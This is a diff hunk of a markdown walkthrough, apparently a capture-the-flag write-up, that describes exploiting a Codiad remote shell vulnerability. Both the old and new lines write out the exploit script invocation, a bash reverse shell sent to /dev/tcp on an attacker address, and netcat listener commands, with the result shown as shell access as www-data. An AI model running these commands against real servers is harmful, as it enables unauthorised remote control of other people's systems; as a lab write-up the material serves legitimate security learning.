@@ -91,14 +91,13 @@ The specific Codiad version used in this box has a well described remote shell u
 4. ***IP address*** of the attacking machine.
 5. ***Port*** that is used to listen to the reverse shell.
 6. ***Platform*** that is running on the server (Windows or Linux).
-	a. When I opened Codiad administration panel within Firefox I found out that the files within the server are located in `/var/www/html` directory, so it can be conducted that this webserver is hosting Linux.
+7. When I opened Codiad administration panel within Firefox I found out that the files within the server are located in `/var/www/html` directory, so it can be conducted that this webserver is hosting Linux.
+
 For succesfully running this exploit, ***3 terminal instances*** need to be used:
-1. In ***the first terminal***, the command for server exploitation is constructed:
-	a. `python3 codiad_exploit.py http://<target-ip>:<target-port> john [REDACTED] <attacker-ip> <listening-port> linux`.
-2. From the exploit a reverse shell command is given to execute on a ***second terminal***.
-	a. Command for this is: `echo `bash -c "bash -i > /dev/tcp/<attacker-ip>/<listening-port>+1 0>&1 2>&1"` | nc -lnvp <listening-port>`.
-3. On the ***third terminal*** a ***netcat listener*** is set up.
-	a. Command for this is `nc -lnvp <listening-port>+1`.
+1. In ***the first terminal***, the command for server exploitation is constructed - `python3 codiad_exploit.py http://<target-ip>:<target-port> john [REDACTED] <attacker-ip> <listening-port> linux`.
+2. From the exploit a reverse shell command is given to execute on a ***second terminal***. Command for this is: `echo 'bash -c "bash -i > /dev/tcp/<attacker-ip>/<listening-port>+1 0>&1 2>&1"' | nc -lnvp <listening-port>`.
+3. On the ***third terminal*** a ***netcat listener*** is set up. Command for this is `nc -lnvp <listening-port>+1`.
+
 After the payload is sent, on the terminal with netcat listener there is an access to the target's shell - `www-data@ide`.
 
 # Privillege Escalation
